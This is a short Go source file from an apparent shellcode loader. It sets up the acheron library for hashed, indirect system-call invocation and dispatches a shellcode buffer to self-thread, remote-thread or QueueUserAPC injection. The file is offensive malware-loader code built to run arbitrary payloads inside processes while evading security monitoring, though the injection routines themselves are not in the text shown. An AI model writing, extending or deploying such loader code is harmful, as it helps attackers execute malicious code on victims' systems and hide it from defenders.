package loader

import (
	"fmt"

	"github.com/f1zm0/acheron"
	"github.com/f1zm0/acheron/pkg/hashing"
	hsh "github.com/f1zm0/hades/pkg/hashing"
)

type Loader struct {
	callProxy *acheron.Acheron
	hashFunc  hashing.HashFunction // func([]byte) uint64
}

func NewLoader() (*Loader, error) {
	if r, err := acheron.New(
		acheron.WithHashFunction(hsh.XORHash),
	); err != nil {
		return nil, err
	} else {
		return &Loader{
			callProxy: r,
			hashFunc:  hsh.XORHash,
		}, nil
	}
}

func (l *Loader) Load(scBuf []byte, technique string) error {
	switch technique {
	case "selfthread":
		return l.selfInjectThread(scBuf)
	case "remotethread":
		return l.remoteThreadInject(scBuf)
	case "queueuserapc":
		return l.queueUserAPC(scBuf)
	default:
		fmt.Printf("[!] Invalid technique %s", technique)
	}
	return nil
}
